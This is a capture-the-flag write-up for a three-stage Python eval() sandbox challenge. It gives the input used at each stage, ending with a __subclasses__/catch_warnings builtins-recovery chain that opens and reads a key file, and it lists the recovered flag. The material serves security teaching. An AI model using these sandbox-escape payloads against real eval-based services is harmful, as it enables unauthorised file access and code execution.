## ProcrastinatorProgrammer

*I may have procrastinated security for `procrastinate.chal.2021.sunshinectf.org:65000`. I may have been watching too many Tom Cruise movies instead of releasing this... uh... last year.*

*But don't worry! The keys to the kingdom are split into three parts... you'll never find them all!*

*Flag will be given by our backend in the standard `sun{}` format, but make sure you put all the pieces together!*

---
1. Part One

  ```
Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!I'm super secure, and can use all python! I just use `eval()` on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!

Give me an equation please!
  ```

`eval()`,使用`open('key','r').readlines()`得到flag的第一部分`sun{eval_is`

2. Part Two

```
Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I've upped my ante! Now I know it's secure!I'm super secure, and can use most python math! I just use `eval(client_input, \{\}, safe_math_functions)` on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!
   
Halt in the name of the law!
   
What was the ./key found in the previous challenge?
```

`eval(client_input, {}, safe_math_functions)`,使用`__builtins__['open']('key', 'r').read()`得到flag的第二部分`_safe_`

3. Part Three

```
Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!... I think. Google tells me that it's secure now! Well the second result anyhow.I'm super secure, and can use a bit of python math! I just use `eval(client_input, {'__builtins__':\{\}})` on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!
   
Halt in the name of the law!
   
What was the ./key found in the previous challenge?
```

`eval(client_input, {'__builtins__':{}})`,使用`[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ =="catch_warnings"][0]()._module.__builtins__['open']('key', 'r').read()`得到flag的第三部分`only_if_you_ast_whitelist_first}`

参考文章:

* [safe eval](http://lybniz2.sourceforge.net/safeeval.html)
* [python 沙箱逃逸与SSTI](https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/)


**flag:**`sun{eval_is_safe_only_if_you_ast_whitelist_first}`